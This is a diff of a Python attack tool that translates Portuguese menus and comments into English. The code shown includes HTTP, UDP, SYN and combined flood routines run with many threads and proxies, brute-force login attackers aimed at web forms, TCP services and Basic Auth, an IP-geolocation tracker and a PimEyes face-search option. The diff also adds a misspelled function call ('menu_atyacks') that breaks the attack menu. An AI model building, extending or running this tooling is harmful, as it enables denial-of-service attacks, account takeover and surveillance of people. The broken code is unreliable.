@@ -2,7 +2,7 @@ import os, sys, time, random, socket, requests
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
 
-# === CONFIGURAÇÕES ===
+# === CONFIGURATION ===
 MAX_THREADS = 500
 TIMEOUT = 5
 PROXY_FILE = "proxy.txt"
@@ -33,7 +33,7 @@ def load_proxies():
         return [l.strip() for l in open(PROXY_FILE) if l.strip()]
     return []
 
-# === ATAQUES ===
+# === ATTACKS ===
 def http_flood(url, proxy=None):
     sess = requests.Session()
     headers = {"User-Agent": random.choice(USER_AGENTS)}
@@ -79,7 +79,7 @@ def combo_flood(url):
             ex.submit(udp_flood, ip, port_udp)
             ex.submit(syn_flood, ip, port_tcp)
 
-# === FORÇA BRUTA ===
+# === BRUTE FORCE ===
 def megamedusa_brute(url):
     print(f"{C.Y}MegaMedusa brute → {url}{C.E}")
     sess = requests.Session()
@@ -118,7 +118,7 @@ def basic_auth_brute(url):
                 print(f"[-] {u}:{p}")
             except: pass
 
-# === RASTREAMENTO IP ===
+# === TRACKING IP ===
 def trace_ip_api(ip):
     print(f"{C.C}Rastreando IP → {ip}{C.E}")
     try:
@@ -127,12 +127,12 @@ def trace_ip_api(ip):
             for k in ["country","regionName","city","isp","org","lat","lon"]:
                 print(f"{k.capitalize()}: {r.get(k)}")
         else:
-            print("Busca falhou.")
+            print("Search failed.")
     except Exception as e:
         print("Erro:", e)
 
 def trace_ip_multi(ip):
-    print(f"{C.C}Verificando IPinfo + ip-api{C.E}")
+    print(f"{C.C}Verification IPinfo + ip-api{C.E}")
     try:
         r=requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
         print("IPinfo:", r.get("org"), r.get("country"), r.get("timezone"))
@@ -159,56 +159,56 @@ def pimeyes_search(query):
 # === MENUS ===
 def menu():
     banner()
-    print(f"{C.Y}1{C.E} - Ataques")
-    print(f"{C.Y}2{C.E} - Força Bruta")
-    print(f"{C.Y}3{C.E} - Rastreamento IP")
+    print(f"{C.Y}1{C.E} - Attack")
+    print(f"{C.Y}2{C.E} - Brute Force")
+    print(f"{C.Y}3{C.E} - Tracking IP")
     print(f"{C.Y}4{C.E} - PimEyes Search")
-    print(f"{C.Y}0{C.E} - Sair")
+    print(f"{C.Y}0{C.E} - To Go")
     return input("Escolha: ").strip()
 
 def menu_ataques():
-    clear(); print(f"{C.R}=== ATAQUES ==={C.E}")
+    clear(); print(f"{C.R}=== ATTACK ==={C.E}")
     print("1 - HTTP Flood\n2 - UDP Flood\n3 - SYN Flood\n4 - Combo\n0 - Voltar")
     return input("Opção: ").strip()
 
 def menu_brute():
-    clear(); print(f"{C.R}=== FORÇA BRUTA ==={C.E}")
+    clear(); print(f"{C.R}=== BRUTE FORCE ==={C.E}")
     print("1 - MegaMedusa (HTTP POST)\n2 - Pandora (TCP)\n3 - HTTP Basic Auth\n0 - Voltar")
     return input("Opção: ").strip()
 
 def menu_trace():
-    clear(); print(f"{C.R}=== RASTREAMENTO IP ==={C.E}")
+    clear(); print(f"{C.R}=== TRACKING IP ==={C.E}")
     print("1 - Trace IP\n0 - Voltar")
     return input("Opção: ").strip()
 
 def menu_pimeyes():
     clear(); print(f"{C.R}=== PIMEYES ==={C.E}")
-    print("1 - Buscar\n0 - Voltar")
-    return input("Opção: ").strip()
+    print("1 - Look for\n0 - To go back")
+    return input("Option: ").strip()
 
 # === LOOP PRINCIPAL ===
 def main():
     while True:
         op = menu()
         if op=="1":
-            ao = menu_ataques()
+            ao = menu_atyacks()
             if ao=="1":
-                url=input("URL alvo: ")
+                url=input("URL target: ")
                 t=int(input("Threads: "))
                 ps=load_proxies()
                 with ThreadPoolExecutor(t) as ex:
                     for _ in range(t):
                         ex.submit(http_flood, url, random.choice(ps) if ps else None)
             elif ao=="2":
-                ip=input("IP alvo: "); port=int(input("Porta UDP: ")); t=int(input("Threads: "))
+                ip=input("IP target: "); port=int(input("UDP Port : ")); t=int(input("Threads: "))
                 with ThreadPoolExecutor(t) as ex:
                     for _ in range(t): ex.submit(udp_flood, ip, port)
             elif ao=="3":
-                ip=input("IP alvo: "); port=int(input("Porta TCP: ")); t=int(input("Threads: "))
+                ip=input("IP target: "); port=int(input("TCP Port : ")); t=int(input("Threads: "))
                 with ThreadPoolExecutor(t) as ex:
                     for _ in range(t): ex.submit(syn_flood, ip, port)
             elif ao=="4":
-                combo_flood(input("URL alvo (http://...): "))
+                combo_flood(input("URL target (http://...): "))
         elif op=="2":
             bo = menu_brute()
             if bo=="1": megamedusa_brute(input("URL login endpoint: "))
